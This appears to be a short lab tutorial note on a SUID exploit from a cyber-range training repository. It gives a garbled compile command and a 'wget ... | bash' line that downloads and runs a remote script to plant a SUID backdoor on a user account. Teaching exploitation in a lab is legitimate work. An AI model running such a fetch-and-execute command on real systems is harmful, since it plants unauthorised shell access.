# SUID Exploit Cliff-Notes

The poc.c is compiled into progrma.
	`gcc -i poc poc.c`

The poc calls the malicious script which has SUID bit set for the user.

The user is compromised by performing: 
wget -O - https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/getme.sh | bash

This creates a suid exposed vulnerability on the user, allows anyone to execute a shell script as the user.
